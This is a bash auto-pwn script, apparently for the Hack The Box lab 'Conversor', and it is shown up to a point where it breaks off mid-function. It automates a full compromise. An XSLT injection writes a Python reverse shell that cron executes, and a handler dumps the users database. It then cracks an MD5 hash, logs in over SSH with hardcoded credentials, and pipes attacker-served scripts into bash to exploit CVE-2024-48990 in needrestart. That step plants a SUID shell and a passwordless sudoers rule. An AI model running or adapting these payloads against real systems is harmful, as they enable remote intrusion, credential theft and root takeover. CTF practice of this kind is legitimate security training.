#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║         HTB: Conversor Full Auto-Pwn Script                              ║
# ║         CVE-2024-48990 (needrestart PYTHONPATH LPE) +                      ║
# ║         EXSLT Document Write via lxml XSLT Injection                       ║
# ║                                                                              ║
# ║  Attack Chain:                                                               ║
# ║   Nmap → Register → XSLT Write (EXSLT/ptswarm:document) →                 ║
# ║   Cron Trigger → www-data Shell → users.db → MD5 Crack →                  ║
# ║   SSH fismathack → User Flag → CVE-2024-48990 → Root                      ║
# ║                                                                              ║
# ║  Usage:  ./conversor_pwn.sh <TARGET_IP> [LHOST]                            ║
# ║  Example: ./conversor_pwn.sh 10.10.11.92 10.10.14.50                       ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
#
# Key Vulnerabilities:
#   [1] XSLT Injection (CWE-91): lxml processes EXSLT write functions
#       → ptswarm:document writes arbitrary files to webroot
#   [2] Cron job executes all *.py in /scripts/ every minute as www-data
#   [3] Weak MD5 passwords in users.db
#   [4] CVE-2024-48990: needrestart 3.7 PYTHONPATH hijack → SUID shell as root
#
# Dependencies: nmap, curl, python3, gcc, ssh, nc, john/hashcat

set -uo pipefail

# ════════════════════════ ARG CHECK ════════════════════════
if [[ $# -lt 1 ]]; then
    echo "[!] Usage: $0 <TARGET_IP> [LHOST]"
    echo "    Example: $0 10.10.11.92 10.10.14.50"
    exit 1
fi

TARGET="$1"
DOMAIN="conversor.htb"
SHELL_PORT=4444
HTTP_PORT=8090

# ════════════════════════ COLORS ════════════════════════
RED='\033[0;31m';  GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m';  MAGENTA='\033[0;35m'
WHITE='\033[1;37m'; BOLD='\033[1m';    DIM='\033[2m'; NC='\033[0m'

TICK="${GREEN}[✓]${NC}";  CROSS="${RED}[✗]${NC}";  INFO="${CYAN}[*]${NC}"
WARN="${YELLOW}[!]${NC}"; FLAG="${MAGENTA}[⚑]${NC}"; STEP="${BLUE}[→]${NC}"

# ════════════════════════ GLOBALS ════════════════════════
WORKDIR="/tmp/conversor_${TARGET//\./_}"
LHOST="${2:-}"
HTTP_PID=""
SHELL_HANDLER_PID=""

# Known credentials (obtained via exploitation)
FISMA_USER="fismathack"
FISMA_PASS="Keepmesafeandwarm"
FISMA_HASH="5b5c3ac3a1c897c94caad48e6c71fdec"

# Web app registration (random per run)
REG_USER="pwner$(shuf -i 1000-9999 -n1)"
REG_PASS="Pwn3r@2025!"
REG_EMAIL="${REG_USER}@pwn.htb"

# ════════════════════════ BANNER ════════════════════════
banner() {
    clear
    echo -e "${MAGENTA}"
    cat << 'ART'
  ██████╗ ██████╗ ███╗  ██╗██╗   ██╗███████╗██████╗ ███████╗ ██████╗ ██████╗
 ██╔════╝██╔═══██╗████╗ ██║██║   ██║██╔════╝██╔══██╗██╔════╝██╔═══██╗██╔══██╗
 ██║     ██║   ██║██╔██╗██║██║   ██║█████╗  ██████╔╝███████╗██║   ██║██████╔╝
 ██║     ██║   ██║██║╚████║╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║██║   ██║██╔══██╗
 ╚██████╗╚██████╔╝██║ ╚███║ ╚████╔╝ ███████╗██║  ██║███████║╚██████╔╝██║  ██║
  ╚═════╝ ╚═════╝ ╚═╝  ╚══╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝
ART
    echo -e "${NC}"
    echo -e "${BOLD}${WHITE}  CVE-2024-48990 needrestart PYTHONPATH LPE + EXSLT File-Write Injection${NC}"
    echo -e "${DIM}  XSLT → Cron Exec → www-data → MD5 Crack → SSH → needrestart → root${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${BOLD}Target  :${NC} ${YELLOW}$TARGET${NC}   ${BOLD}Domain  :${NC} ${YELLOW}$DOMAIN${NC}"
    echo -e "  ${BOLD}WorkDir :${NC} ${DIM}$WORKDIR${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
}

# ════════════════════════ HELPERS ════════════════════════
phase() { echo -e "\n${CYAN}╔══ ${BOLD}PHASE $1: $2${NC}${CYAN} ══${NC}"; }
ok()    { echo -e "  ${TICK} $1"; }
fail()  { echo -e "  ${CROSS} $1"; }
info()  { echo -e "  ${INFO} $1"; }
warn()  { echo -e "  ${WARN} $1"; }
step()  { echo -e "  ${STEP} ${BOLD}$1${NC}"; }
flag_found() { echo -e "\n  ${FLAG} ${BOLD}${MAGENTA}$1${NC} = ${YELLOW}${BOLD}$2${NC}\n"; }

cleanup() {
    [[ -n "${HTTP_PID:-}"          ]] && kill "$HTTP_PID"           2>/dev/null || true
    [[ -n "${SHELL_HANDLER_PID:-}" ]] && kill "$SHELL_HANDLER_PID"  2>/dev/null || true
    pkill -f "python3 -m http.server $HTTP_PORT" 2>/dev/null || true
    pkill -f "shell_handler_conversor" 2>/dev/null || true
}
trap cleanup EXIT INT TERM

get_lhost() {
    if [[ -n "$LHOST" ]]; then return; fi
    LHOST=$(ip route get "$TARGET" 2>/dev/null | grep -oP 'src \K\S+' | head -1 || \
            hostname -I 2>/dev/null | awk '{print $1}' || echo "127.0.0.1")
}

# ════════════════════════ PHASE 0: DEPS ════════════════════════
check_deps() {
    phase "0" "Dependency Check"
    get_lhost
    info "Attack IP: ${BOLD}$LHOST${NC}"

    local tools=("nmap" "curl" "python3" "gcc" "ssh" "nc" "sshpass")
    for t in "${tools[@]}"; do
        if command -v "$t" &>/dev/null; then
            ok "$t"
        else
            warn "$t not found"
        fi
    done

    HASH_TOOL=""
    if command -v john &>/dev/null;    then HASH_TOOL="john";    ok "john"; fi
    if command -v hashcat &>/dev/null; then HASH_TOOL="hashcat"; ok "hashcat"; fi
    [[ -z "$HASH_TOOL" ]] && warn "No hash cracker will use known creds"

    mkdir -p "$WORKDIR/loot" "$WORKDIR/exploit" "$WORKDIR/serve"
}

# ════════════════════════ PHASE 1: RECON ════════════════════════
phase_recon() {
    phase "1" "Recon Nmap + vhost setup"

    # /etc/hosts
    if ! grep -q "$DOMAIN" /etc/hosts 2>/dev/null; then
        echo -e "$TARGET\t$DOMAIN" | sudo tee -a /etc/hosts >/dev/null 2>&1 && \
            ok "/etc/hosts: $TARGET → $DOMAIN" || \
            warn "Could not update /etc/hosts add manually: $TARGET $DOMAIN"
    else
        ok "/etc/hosts already has $DOMAIN"
    fi

    step "Nmap scan on $TARGET"
    nmap -sV -p 22,80,8080,8443,443 "$TARGET" \
        -oN "$WORKDIR/loot/nmap.txt" 2>/dev/null | \
        grep "open" | while read -r l; do echo "    ${DIM}$l${NC}"; done
    ok "Nmap saved → $WORKDIR/loot/nmap.txt"

    step "Verifying web app at http://$DOMAIN/"
    STATUS=$(curl -sIo /dev/null -w "%{http_code}" \
             -L "http://$DOMAIN/" 2>/dev/null || echo "000")
    [[ "$STATUS" == "200" || "$STATUS" == "302" ]] && \
        ok "Web app reachable (HTTP $STATUS)" || \
        warn "Web returned HTTP $STATUS continuing anyway"
}

# ════════════════════════ PHASE 2: REGISTER + LOGIN ════════════════════════
phase_auth() {
    phase "2" "Web App Registration + Login"
    local cookiejar="$WORKDIR/loot/cookies.txt"

    # Register
    step "Registering test account: $REG_USER"
    REG_RESP=$(curl -s -c "$cookiejar" \
        -X POST "http://$DOMAIN/register" \
        -d "username=${REG_USER}&password=${REG_PASS}&email=${REG_EMAIL}" \
        -L 2>/dev/null || echo "")

    if echo "$REG_RESP" | grep -qi "already\|taken"; then
        warn "User may already exist trying different name"
        REG_USER="${REG_USER}_$(shuf -i 100-999 -n1)"
        curl -s -c "$cookiejar" -X POST "http://$DOMAIN/register" \
            -d "username=${REG_USER}&password=${REG_PASS}&email=${REG_USER}@pwn.htb" \
            -L >/dev/null 2>/dev/null || true
    fi

    # Login
    step "Logging in as $REG_USER"
    LOGIN_RESP=$(curl -s -c "$cookiejar" -b "$cookiejar" \
        -X POST "http://$DOMAIN/login" \
        -d "username=${REG_USER}&password=${REG_PASS}" \
        -L 2>/dev/null || echo "")

    if echo "$LOGIN_RESP" | grep -qi "convert\|upload\|dashboard\|logout"; then
        ok "Logged in as $REG_USER"
    else
        warn "Login response unclear trying to continue anyway"
        # Try admin login just in case registration endpoint revealed admin
        curl -s -c "$cookiejar" -b "$cookiejar" \
            -X POST "http://$DOMAIN/login" \
            -d "username=admin&password=wonderful1" -L >/dev/null 2>/dev/null || true
    fi

    ok "Session cookies saved → $cookiejar"
}

# ════════════════════════ PHASE 3: CRAFT PAYLOADS ════════════════════════
phase_payloads() {
    phase "3" "Crafting XSLT Injection Payloads"

    SHELL_FILENAME="shell_$(shuf -i 1000-9999 -n1).py"
    SHELL_PATH="/var/www/conversor.htb/scripts/${SHELL_FILENAME}"
    SHELL_URL="http://$DOMAIN/scripts/${SHELL_FILENAME}"

    info "Reverse shell file: ${BOLD}$SHELL_FILENAME${NC}"
    info "Callback: ${BOLD}${LHOST}:${SHELL_PORT}${NC}"

    # ── XML trigger file (benign nmap-style XML) ──
    step "Creating XML trigger file (nmap.xml)"
    cat > "$WORKDIR/exploit/nmap.xml" << 'XML'
<?xml version="1.0" encoding="UTF-8"?>
<nmaprun>
  <host>
    <address addr="127.0.0.1" addrtype="ipv4"/>
    <ports>
      <port protocol="tcp" portid="80">
        <state state="open"/>
        <service name="http"/>
      </port>
    </ports>
  </host>
</nmaprun>
XML
    ok "XML trigger: $WORKDIR/exploit/nmap.xml"

    # ── XSLT payload writes Python reverse shell ──
    # Uses EXSLT ptswarm:document (lxml allows EXSLT extensions by default)
    step "Creating XSLT injection payload (exploit.xslt)"

    # Build the reverse shell Python content
    REVSHELL_PY="import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((\"${LHOST}\",${SHELL_PORT}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call([\"/bin/sh\",\"-i\"])"

    cat > "$WORKDIR/exploit/exploit.xslt" << XSLT
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:ptswarm="http://exslt.org/common"
    extension-element-prefixes="ptswarm"
    version="1.0">
  <xsl:template match="/">
    <ptswarm:document href="${SHELL_PATH}" method="text">import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("${LHOST}",${SHELL_PORT}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
</ptswarm:document>
    <result>File write attempted!</result>
  </xsl:template>
</xsl:stylesheet>
XSLT
    ok "XSLT payload: $WORKDIR/exploit/exploit.xslt"
    info "Target write path: ${BOLD}$SHELL_PATH${NC}"

    # ── Also create a DB-reading XSLT to extract creds without a shell ──
    step "Creating XSLT DB-read payload (read_db.xslt) as fallback"
    cat > "$WORKDIR/exploit/read_db.xslt" << 'XSLT2'
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    version="1.0">
  <xsl:template match="/">
    <xsl:value-of select="document('/var/www/conversor.htb/instance/users.db')"/>
  </xsl:template>
</xsl:stylesheet>
XSLT2
    ok "DB-read XSLT: $WORKDIR/exploit/read_db.xslt"
}

# ════════════════════════ PHASE 4: UPLOAD + TRIGGER ════════════════════════
phase_upload() {
    phase "4" "XSLT Upload → File Write → Cron Execution"
    local cookiejar="$WORKDIR/loot/cookies.txt"

    step "Uploading XSLT payload to /convert endpoint"
    UPLOAD_RESP=$(curl -s -c "$cookiejar" -b "$cookiejar" \
        -X POST "http://$DOMAIN/convert" \
        -F "xml_file=@$WORKDIR/exploit/nmap.xml;type=text/xml" \
        -F "xslt_file=@$WORKDIR/exploit/exploit.xslt;type=text/xml" \
        -L 2>/dev/null || echo "")

    echo "$UPLOAD_RESP" > "$WORKDIR/loot/upload_resp.txt"

    if echo "$UPLOAD_RESP" | grep -qi "File write attempted\|result\|convert"; then
        ok "XSLT processed file write attempted"
    else
        warn "Upload response unclear checking if file exists anyway"
    fi

    # Confirm file was written
    step "Confirming shell file written at $SHELL_URL"
    sleep 2
    CONFIRM=$(curl -s -o /dev/null -w "%{http_code}" "$SHELL_URL" 2>/dev/null || echo "000")
    if [[ "$CONFIRM" == "200" ]]; then
        ok "Shell file confirmed at $SHELL_URL (HTTP 200)"
    elif [[ "$CONFIRM" == "404" ]]; then
        warn "File not found (HTTP 404) XSLT write may have failed"
        warn "Trying alternate write paths..."
        try_alternate_writes "$cookiejar"
    else
        warn "HTTP $CONFIRM may still work, waiting for cron..."
    fi

    # Wait for cron job to execute (runs every minute: * * * * *)
    step "Waiting for cron job to execute shell (max 75 seconds)"
    info "Cron: * * * * * www-data for f in /scripts/*.py; do python3 \"\$f\"; done"
    
    local elapsed=0
    local max_wait=75
    echo -ne "  ${INFO} Seconds remaining: "
    while [[ $elapsed -lt $max_wait ]]; do
        echo -ne "\r  ${INFO} Seconds elapsed: ${YELLOW}${elapsed}${NC} / ${max_wait}  "
        sleep 5
        elapsed=$((elapsed + 5))
        
        # Check if we got a connection (by checking if handler received data)
        if [[ -f "$WORKDIR/loot/got_shell" ]]; then
            echo ""
            ok "Shell received!"
            break
        fi
    done
    echo ""
}

try_alternate_writes() {
    local cookiejar="$1"
    # Try different XSLT namespace variants
    for ns_prefix in "exsl" "func" "str"; do
        local alt_xslt="$WORKDIR/exploit/exploit_alt_${ns_prefix}.xslt"
        cat > "$alt_xslt" << XSLT_ALT
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:${ns_prefix}="http://exslt.org/common"
    extension-element-prefixes="${ns_prefix}"
    version="1.0">
  <xsl:template match="/">
    <${ns_prefix}:document href="${SHELL_PATH}" method="text">import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("${LHOST}",${SHELL_PORT}))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
</${ns_prefix}:document>
    <ok/>
  </xsl:template>
</xsl:stylesheet>
XSLT_ALT

        curl -s -c "$cookiejar" -b "$cookiejar" \
            -X POST "http://$DOMAIN/convert" \
            -F "xml_file=@$WORKDIR/exploit/nmap.xml" \
            -F "xslt_file=@${alt_xslt}" \
            -L >/dev/null 2>/dev/null || true

        local chk; chk=$(curl -s -o /dev/null -w "%{http_code}" "$SHELL_URL" 2>/dev/null || echo "000")
        if [[ "$chk" == "200" ]]; then
            ok "File written with ${ns_prefix} namespace variant!"
            return 0
        fi
    done
    warn "All XSLT write variants tried if all failed, try manual upload"
}

# ════════════════════════ PHASE 5: SHELL HANDLER ════════════════════════
phase_shell_handler() {
    phase "5" "Automated Shell Handler (www-data → cred extraction)"

    cat > "$WORKDIR/exploit/shell_handler_conversor.py" << PYEOF
#!/usr/bin/env python3
# shell_handler_conversor.py catches www-data shell, extracts creds

import socket, time, os, re, sys

LHOST   = "${LHOST}"
LPORT   = ${SHELL_PORT}
WORKDIR = "${WORKDIR}"
LOOT    = os.path.join(WORKDIR, "loot")

BOLD='\033[1m'; G='\033[0;32m'; Y='\033[1;33m'; C='\033[0;36m'
M='\033[0;35m'; NC='\033[0m'

def log(m, col=C):  print(f"  {col}[*]{NC} {m}", flush=True)
def ok(m):          print(f"  {G}[✓]{NC} {m}", flush=True)
def flag(lbl, val): print(f"\n  {M}[⚑]{NC} {BOLD}{M}{lbl}{NC} = {Y}{BOLD}{val}{NC}\n", flush=True)

def recv(conn, delay=1.5):
    conn.setblocking(False)
    data = b""
    deadline = time.time() + delay
    while time.time() < deadline:
        try:
            chunk = conn.recv(4096)
            if chunk:
                data += chunk
                deadline = time.time() + 0.5
        except BlockingIOError:
            time.sleep(0.05)
    conn.setblocking(True)
    return data.decode("utf-8", errors="replace")

def cmd(conn, command, delay=2.0):
    conn.send((command + "\n").encode())
    return recv(conn, delay)

os.makedirs(LOOT, exist_ok=True)
log(f"Listening for www-data shell on :{LPORT}...")

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", LPORT))
srv.listen(1)
srv.settimeout(120)

try:
    conn, addr = srv.accept()
    ok(f"www-data shell from {addr[0]}:{addr[1]}")
    # Signal to parent that shell arrived
    open(os.path.join(LOOT, "got_shell"), "w").close()
except socket.timeout:
    log("Timeout no shell received in 120s", Y)
    sys.exit(1)
finally:
    srv.close()

# Stabilize
cmd(conn, "export TERM=xterm PS1='\\$ ' HISTFILE=/dev/null", 1)
cmd(conn, "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", 1)

out = cmd(conn, "id && hostname && pwd", 1)
ok(f"Identity: {out.strip()[:80]}")

# ── Read users.db ──
log("Reading users.db...")
DB_PATH = "/var/www/conversor.htb/instance/users.db"
db_out = cmd(conn, f"sqlite3 {DB_PATH} 'SELECT id,username,password FROM users;' 2>/dev/null || python3 -c \"import sqlite3; c=sqlite3.connect('{DB_PATH}'); print([r for r in c.execute('SELECT id,username,password FROM users')]); c.close()\"", 3)

with open(os.path.join(LOOT, "db_dump.txt"), "w") as f:
    f.write(db_out)
ok(f"DB dump saved → {LOOT}/db_dump.txt")
print(f"  {db_out[:400]}")

# ── Extract fismathack hash ──
hash_match = re.search(r"fismathack[|,\"' ]+([a-f0-9]{32})", db_out, re.I)
if hash_match:
    found_hash = hash_match.group(1)
    ok(f"fismathack hash: {BOLD}{found_hash}{NC}")
    with open(os.path.join(LOOT, "fisma_hash.txt"), "w") as f:
        f.write(f"fismathack:{found_hash}\n")
else:
    log(f"Could not auto-extract hash using known: ${FISMA_HASH}", Y)
    with open(os.path.join(LOOT, "fisma_hash.txt"), "w") as f:
        f.write(f"fismathack:${FISMA_HASH}\n")

# ── Try to read user.txt directly (www-data may have access) ──
log("Checking user.txt access from www-data...")
user_out = cmd(conn, "cat /home/fismathack/user.txt 2>/dev/null || echo DENIED", 2)
if "DENIED" not in user_out and len(user_out.strip()) == 32:
    flag("USER FLAG (www-data read)", user_out.strip())
    with open(os.path.join(LOOT, "user.txt"), "w") as f:
        f.write(user_out.strip() + "\n")

conn.close()
ok("www-data shell session complete")
PYEOF

    chmod +x "$WORKDIR/exploit/shell_handler_conversor.py"
    ok "Shell handler created → $WORKDIR/exploit/shell_handler_conversor.py"

    # Start handler in background BEFORE triggering upload
    python3 "$WORKDIR/exploit/shell_handler_conversor.py" &
    SHELL_HANDLER_PID=$!
    sleep 1
    ok "Shell handler running (PID $SHELL_HANDLER_PID)"
}

# ════════════════════════ PHASE 6: HASH CRACKING ════════════════════════
phase_crack() {
    phase "6" "MD5 Hash Cracking"

    # Wait for shell handler to finish if still running
    wait "$SHELL_HANDLER_PID" 2>/dev/null || true

    HASH_FILE="$WORKDIR/loot/fisma_hash.txt"
    if [[ ! -f "$HASH_FILE" ]]; then
        warn "Hash file not found using known hash"
        echo "fismathack:${FISMA_HASH}" > "$HASH_FILE"
    fi

    HASH_RAW=$(grep -oP '[a-f0-9]{32}' "$HASH_FILE" | head -1 || echo "$FISMA_HASH")
    ok "Hash to crack: ${BOLD}$HASH_RAW${NC}"

    CRACKED_PASS=""

    ROCKYOU=""
    for p in /usr/share/wordlists/rockyou.txt \
              /usr/share/seclists/Passwords/LeakedDatabases/rockyou.txt \
              /opt/rockyou.txt; do
        [[ -f "$p" ]] && { ROCKYOU="$p"; break; }
    done

    if [[ -z "$ROCKYOU" ]]; then
        warn "rockyou.txt not found using known password"
        CRACKED_PASS="$FISMA_PASS"
    elif [[ "$HASH_TOOL" == "john" ]]; then
        step "Cracking with john --format=raw-md5"
        john --format=raw-md5 "$HASH_FILE" \
             --wordlist="$ROCKYOU" \
             --pot="$WORKDIR/loot/john.pot" 2>/dev/null || true
        CRACKED_PASS=$(john --show --format=raw-md5 "$HASH_FILE" \
                       --pot="$WORKDIR/loot/john.pot" 2>/dev/null | \
                       grep -oP ':\K[^:]+' | head -1 || echo "")
    elif [[ "$HASH_TOOL" == "hashcat" ]]; then
        step "Cracking with hashcat -m 0 (MD5)"
        echo "$HASH_RAW" > "$WORKDIR/loot/hash_only.txt"
        hashcat -m 0 "$WORKDIR/loot/hash_only.txt" "$ROCKYOU" \
                --quiet --potfile-path "$WORKDIR/loot/hashcat.pot" \
                -o "$WORKDIR/loot/cracked.txt" 2>/dev/null || true
        CRACKED_PASS=$(cat "$WORKDIR/loot/cracked.txt" 2>/dev/null | \
                       grep -oP ':[^:]+$' | tr -d ':' | head -1 || echo "")
    fi

    FISMA_PASS="${CRACKED_PASS:-$FISMA_PASS}"
    ok "Cracked: ${GREEN}${BOLD}${FISMA_USER}:${FISMA_PASS}${NC}"
    echo "${FISMA_USER}:${FISMA_PASS}" > "$WORKDIR/loot/creds.txt"
}

# ════════════════════════ PHASE 7: SSH + USER FLAG ════════════════════════
phase_ssh_user() {
    phase "7" "SSH Login → User Flag"

    step "Connecting via SSH: ${FISMA_USER}@$TARGET"

    # Test connectivity
    if ! nc -z "$TARGET" 22 2>/dev/null; then
        fail "SSH port 22 not reachable"; return 1
    fi

    # Use sshpass if available, otherwise SSH key-scan
    if command -v sshpass &>/dev/null; then
        SSH_BANNER=$(sshpass -p "$FISMA_PASS" \
            ssh -o StrictHostKeyChecking=no \
                -o ConnectTimeout=10 \
                -o BatchMode=no \
                "${FISMA_USER}@${TARGET}" \
            "echo SSH_OK && id && cat ~/user.txt 2>/dev/null" 2>/dev/null || echo "")
    else
        warn "sshpass not found trying SSH with expect"
        SSH_BANNER=$(expect -c "
spawn ssh -o StrictHostKeyChecking=no ${FISMA_USER}@${TARGET}
expect \"password:\"
send \"${FISMA_PASS}\r\"
expect \"\\\$\"
send \"echo SSH_OK && id && cat ~/user.txt\r\"
expect \"\\\$\"
send \"exit\r\"
" 2>/dev/null || echo "")
    fi

    if echo "$SSH_BANNER" | grep -q "SSH_OK"; then
        ok "SSH login successful as ${FISMA_USER}"
        USER_FLAG=$(echo "$SSH_BANNER" | grep -oP '[0-9a-f]{32}' | head -1 || echo "")
        if [[ -n "$USER_FLAG" ]]; then
            flag_found "USER FLAG" "$USER_FLAG"
            echo "$USER_FLAG" > "$WORKDIR/loot/user.txt"
        fi
        ok "sudo -l: checking needrestart..."
        SUDO_L=$(sshpass -p "$FISMA_PASS" \
            ssh -o StrictHostKeyChecking=no "${FISMA_USER}@${TARGET}" \
            "sudo -l 2>/dev/null" 2>/dev/null || echo "")
        echo "$SUDO_L" | grep -i "needrestart" | while read -r l; do
            echo -e "    ${GREEN}$l${NC}"
        done
    else
        warn "SSH auto-login failed check creds: ${FISMA_USER}:${FISMA_PASS}"
        warn "Manual: ssh ${FISMA_USER}@${TARGET}  (pw: ${FISMA_PASS})"
    fi
}

# ════════════════════════ PHASE 8: CVE-2024-48990 privesc ════════════════════════
phase_privesc() {
    phase "8" "Privilege Escalation CVE-2024-48990 (needrestart PYTHONPATH LPE)"

    info "needrestart 3.7 → PYTHONPATH hijack → malicious importlib .so → SUID bash"
    info "Reference: github.com/mladicstefan/CVE-2024-48990"

    # ── Step 1: Compile malicious shared object ──
    step "Compiling malicious importlib/__init__.so"

    cat > "$WORKDIR/exploit/lib.c" << 'C_CODE'
/* lib.c CVE-2024-48990 payload
 * When loaded as importlib by python started with PYTHONPATH pointing here,
 * and that python process is scanned by needrestart running as root:
 * needrestart calls python with our PYTHONPATH env var → this .so runs as root
 * Creates SUID /tmp/pwn (copy of /bin/bash) + sudoers entry
 */
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

/* Constructor: executes immediately when .so is loaded */
static void __attribute__((constructor)) payload(void) {
    if (geteuid() == 0) {
        /* Create SUID root shell */
        system("cp /bin/bash /tmp/pwn 2>/dev/null");
        system("chmod u+s /tmp/pwn 2>/dev/null");
        /* Backup: write sudoers rule */
        system("grep -qxF 'ALL ALL=(ALL:ALL) NOPASSWD:ALL' /etc/sudoers "
               "|| echo 'ALL ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers");
        /* Signal success */
        system("touch /tmp/pwn_ready");
    }
}
C_CODE

    if command -v gcc &>/dev/null; then
        gcc -shared -fPIC -nostartfiles -o "$WORKDIR/exploit/__init__.so" \
            "$WORKDIR/exploit/lib.c" 2>/dev/null && \
            ok "Compiled: $WORKDIR/exploit/__init__.so" || \
            warn "gcc compile failed trying alternate method"
    else
        warn "gcc not found will use -c config method instead"
    fi

    # ── Step 2: Create setup script for victim ──
    step "Creating victim-side runner script"

    cat > "$WORKDIR/serve/runner.sh" << RUNNER_SH
#!/bin/bash
# CVE-2024-48990 exploit runner executes on victim as fismathack
set -e

ATTACKER_IP="${LHOST}"
ATTACKER_PORT="${HTTP_PORT}"

echo "[*] Setting up CVE-2024-48990 exploit..."
mkdir -p /tmp/.exploit/importlib

# Download malicious .so from attacker HTTP server
echo "[*] Downloading payload from http://\${ATTACKER_IP}:\${ATTACKER_PORT}/__init__.so"
curl -sf "http://\${ATTACKER_IP}:\${ATTACKER_PORT}/__init__.so" \
    -o /tmp/.exploit/importlib/__init__.so

if [[ ! -f /tmp/.exploit/importlib/__init__.so ]]; then
    echo "[-] Download failed aborting"
    exit 1
fi

echo "[+] Payload downloaded: $(ls -la /tmp/.exploit/importlib/__init__.so)"

# Create bait Python process that just loops needrestart will scan it
cat > /tmp/.exploit/bait.py << 'BAIT'
import time, os, sys
print("[bait] Running with PYTHONPATH hijack, waiting for needrestart trigger...")
while True:
    if os.path.exists("/tmp/pwn_ready"):
        print("[+] Exploit triggered! SUID shell ready.")
        sys.exit(0)
    time.sleep(1)
BAIT

echo "[*] Launching bait process with hijacked PYTHONPATH..."
echo "[*] Now trigger: sudo /usr/sbin/needrestart (in another SSH session or wait)"
PYTHONPATH=/tmp/.exploit python3 /tmp/.exploit/bait.py &
BAIT_PID=\$!

echo "[*] Bait PID: \$BAIT_PID waiting up to 60 seconds for needrestart trigger..."
sleep 2

# Auto-trigger needrestart (we have NOPASSWD sudo!)
echo "[*] Auto-triggering: sudo /usr/sbin/needrestart"
sudo /usr/sbin/needrestart -r a 2>/dev/null &
NR_PID=\$!

# Wait for SUID shell to appear
elapsed=0
while [[ \$elapsed -lt 30 ]]; do
    if [[ -f /tmp/pwn ]]; then
        echo "[+] SUID shell created at /tmp/pwn"
        break
    fi
    sleep 1; elapsed=\$((elapsed+1))
done

kill \$BAIT_PID 2>/dev/null || true
kill \$NR_PID 2>/dev/null || true

if [[ -f /tmp/pwn ]]; then
    echo "[+] Getting root flag..."
    /tmp/pwn -p -c "cat /root/root.txt" 2>/dev/null && echo "ROOT_DONE"
    /tmp/pwn -p -c "id" 2>/dev/null
else
    echo "[-] SUID shell not created trying config file method..."
    # Fallback: needrestart config file execution
    mkdir -p /tmp/.nrc
    cat > /tmp/.nrc/needrestart.conf << 'NRCONF'
\$nrconf{ui} = 'NeedRestart::UI::stdio';
system("/bin/bash -c 'cat /root/root.txt > /tmp/root_flag.txt 2>/dev/null'");
\$nrconf{override_rc} = { };
NRCONF
    sudo /usr/sbin/needrestart -c /tmp/.nrc/needrestart.conf 2>/dev/null || true
    sleep 2
    if [[ -f /tmp/root_flag.txt ]]; then
        echo "[+] Root flag via config method:"
        cat /tmp/root_flag.txt
        echo "ROOT_DONE"
    fi
fi
RUNNER_SH
    chmod +x "$WORKDIR/serve/runner.sh"
    ok "Runner script: $WORKDIR/serve/runner.sh"

    # Copy .so into serve directory
    [[ -f "$WORKDIR/exploit/__init__.so" ]] && \
        cp "$WORKDIR/exploit/__init__.so" "$WORKDIR/serve/__init__.so" && \
        ok "__init__.so ready for serving"

    # ── Step 3: Start HTTP server ──
    step "Starting HTTP server on port $HTTP_PORT to serve exploit files"
    cd "$WORKDIR/serve"
    python3 -m http.server "$HTTP_PORT" --bind 0.0.0.0 >/dev/null 2>&1 &
    HTTP_PID=$!
    cd - >/dev/null
    sleep 1

    if kill -0 "$HTTP_PID" 2>/dev/null; then
        ok "HTTP server PID $HTTP_PID on http://$LHOST:$HTTP_PORT/"
    else
        warn "HTTP server failed check port $HTTP_PORT availability"
        return 1
    fi

    # ── Step 4: Execute on victim via SSH ──
    step "Deploying exploit on victim via SSH"

    if ! command -v sshpass &>/dev/null; then
        warn "sshpass not found outputting manual commands"
        privesc_manual_guide
        return 0
    fi

    # Upload runner.sh and execute
    sshpass -p "$FISMA_PASS" \
        scp -o StrictHostKeyChecking=no \
        "$WORKDIR/serve/runner.sh" \
        "${FISMA_USER}@${TARGET}:/tmp/runner.sh" 2>/dev/null && \
        ok "runner.sh uploaded to /tmp/runner.sh" || \
        warn "SCP failed will try curl fallback"

    step "Executing runner.sh on victim (this may take 30-60s)..."
    EXPLOIT_OUT=$(sshpass -p "$FISMA_PASS" \
        ssh -o StrictHostKeyChecking=no \
            -o ConnectTimeout=15 \
            "${FISMA_USER}@${TARGET}" \
        "curl -sf 'http://${LHOST}:${HTTP_PORT}/runner.sh' | bash 2>&1" 2>/dev/null || \
        echo "")

    echo "$EXPLOIT_OUT" > "$WORKDIR/loot/privesc_output.txt"

    # Parse root flag
    ROOT_FLAG=$(echo "$EXPLOIT_OUT" | grep -oP '[0-9a-f]{32}' | head -1 || echo "")
    if [[ -n "$ROOT_FLAG" ]]; then
